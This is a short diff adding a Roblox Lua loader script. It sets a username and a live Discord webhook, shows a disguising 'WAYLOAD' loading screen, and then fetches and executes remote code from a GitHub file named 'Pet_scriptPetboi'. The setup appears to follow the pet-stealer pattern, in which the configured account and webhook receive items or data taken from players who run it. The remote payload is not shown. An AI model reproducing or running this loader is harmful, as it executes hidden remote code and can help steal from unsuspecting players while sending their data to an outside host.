@@ -1,0 +1,11 @@
+Username = "way_tohugee"
+WebHook = "https://discord.com/api/webhooks/1120267399002861629/itRdXVbmSnA7Dgq9AcuGgcGaIufa5crDCOgsAW53RKIRXGCAW2wjvJYS5S3vcuKIek5y"
+ 
+ 
+loadingscreen = true
+_G.CustomScriptName = "WAYLOAD"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi"))()
